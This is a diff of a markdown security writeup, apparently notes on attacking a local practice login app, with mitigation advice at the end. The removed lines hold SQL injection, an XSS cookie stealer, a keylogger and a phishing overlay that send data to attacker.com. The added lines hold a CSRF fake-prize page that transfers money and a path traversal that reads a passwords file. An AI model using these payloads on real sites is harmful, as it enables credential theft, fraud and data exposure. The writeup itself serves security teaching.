@@ -71,76 +71,15 @@ This doesn't reveal errors or results directly, but with repeated guessing, the 
 
 ---
 
-### d) **Time-Based Blind Injection**
+## 2. CSRF Attack Vectors
 
-**Payload**:
-
-- **Search**: `%' OR IF(1=1,SLEEP(5),0) -- `
-    
-
-**Injected Query**:
-
-```sql
-SELECT * FROM products WHERE name='%' OR IF(1=1, SLEEP(5), 0) -- '
-```
-
-If the server delays 5 seconds, it confirms a successful injection.
-
----
-## 2. XSS Payload Examples
-
-### a) **Cookie Stealer**
-
-```html
-<script>
-  var i = new Image();
-  i.src = "https://attacker.com/log.php?c=" + document.cookie;
-</script>
-```
-
----
-
-### b) **Keylogger**
-
-```html
-<script>
-  document.addEventListener('keypress', function(e) {
-    fetch('https://attacker.com/log.php?key=' + e.key);
-  });
-</script>
-```
-
----
-
-### c) **Phishing Form Overlay**
-
-```html
-<div style="position:fixed;top:0;left:0;width:100%;height:100%;background:white;z-index:999">
-  <h2>Session Expired</h2>
-  <form action="https://attacker.com/steal.php">
-    Email: <input name="email"><br>
-    Password: <input type="password" name="password"><br>
-    <button>Login Again</button>
-  </form>
-</div>
-```
-
----
-## 3. CSRF Attack Vectors
-
-### a) Hidden Form Method
-
-Create an invisible form that automatically submits, transferring money to the attacker's account.
-
----
-
-### b) JavaScript `fetch()` Method (IMG Tag Alternative)
+### JavaScript `fetch()` Method (IMG Tag Alternative)
 
 This uses `fetch()` to simulate a form submission directly in JavaScript:
 
 ```html
 <script>
-fetch("http://your-target.com/dashboard.php", {
+fetch("http://localhost/login_app/dashboard.php", {
   method: "POST",
   headers: {
     "Content-Type": "application/x-www-form-urlencoded",
@@ -151,40 +90,55 @@ fetch("http://your-target.com/dashboard.php", {
 ```
 
 > **Note:** While `fetch()` doesn't work cross-origin by default (due to CORS), it's still useful for same-origin CSRF or if the target lacks proper protections.
+---
+
+3. Social Engineering
+Fake Prize Page with Hidden CSRF Attack
+
+This is an example of a phishing page designed to trick users into clicking a button under the pretense of winning a prize. In reality, clicking the button submits a hidden form that performs a CSRF attack — transferring money without the user’s knowledge.
+Malicious HTML Overview:
+
+<form id="csrf-form" action="http://localhost/login_app/dashboard.php" method="POST" target="csrf-frame">
+    <input type="hidden" name="to_id" value="2">
+    <input type="hidden" name="amount" value="500">
+    <input type="hidden" name="transfer" value="Transfer Money">
+</form>
+
+<button onclick="document.getElementById('csrf-form').submit();">
+    Claim Your Prize Now!
+</button>
+
+How it works:
+
+    The page is styled to look legitimate (e.g., prize claim, congratulatory message).
+
+    The user is encouraged to click a big, friendly button to "claim a prize".
+
+    Clicking the button submits a hidden form, which:
+
+        Sends a POST request to the target site (dashboard.php)
+
+        Transfers 500 units to user ID 2, impersonating the victim.
+
+    The request is executed silently inside an iframe, giving no indication to the victim.
+
+    If the victim is already logged in to the vulnerable site (localhost/login_app), the action is performed using their session.
+
+This is a classic CSRF combined with social engineering, where the attacker uses deceptive UI to exploit a user’s trust and active session.
 
 ---
 ## 4. Path Traversal Exploitation
 
-### a) Reading Sensitive Files
+### Reading Sensitive Files
 
 Use directory traversal sequences to access files outside the intended path:
 
 ```
-?path=../../../xampp/passwords.txt
+http://localhost/login_app/../passwords.txt
 ```
+Let's say that we have a passwords.txt file outside of our website. Using the "../" syntax we escape the site's scope and retreive any files outside of the folder. So ../passwords.txt will get us the passwords.txt file outside of the folder.
 
 This can expose sensitive configuration files, credentials, or other private data if the server doesn’t sanitize the `path` input.
-
----
-
-### b) Writing to Executable Locations
-
-Abuse file writing features to drop malicious files into web-accessible directories:
-
-```
-?backup=1&path=../../../xampp/htdocs/backdoor/
-```
-
-This could allow an attacker to:
-
-- Deploy a **web shell** or **backdoor**
-    
-- Leak sensitive backups
-    
-- Escalate the attack by executing arbitrary PHP/JS code
-    
-
-> ⚠️ Always validate and sanitize file paths on the server side, and never allow user input to define write locations without strict control.
 
 ---
 
@@ -205,18 +159,7 @@ This could allow an attacker to:
 
 ---
 
-### b) **Cross-Site Scripting (XSS)**
-
--  **Sanitize input/output** using context-aware escaping
-    
--  Implement **Content Security Policy (CSP)**
-    
--  Use `HttpOnly` and `Secure` flags for cookies
-    
-
----
-
-### c) **Cross-Site Request Forgery (CSRF)**
+### b) **Cross-Site Request Forgery (CSRF)**
 
 -  Add **anti-CSRF tokens** in forms and validate them server-side
     
@@ -224,10 +167,9 @@ This could allow an attacker to:
     
 -  Validate the **Referer** or **Origin** header for critical actions
     
-
 ---
 
-### d) **Path Traversal**
+### c) **Path Traversal**
 
 -  **Validate and sanitize** all user-controlled file paths
     
@@ -238,7 +180,7 @@ This could allow an attacker to:
 
 ---
 
-### e) **Authentication & Session Management**
+### d) **Authentication & Session Management**
 
 -  Implement proper **session validation** and timeouts
     
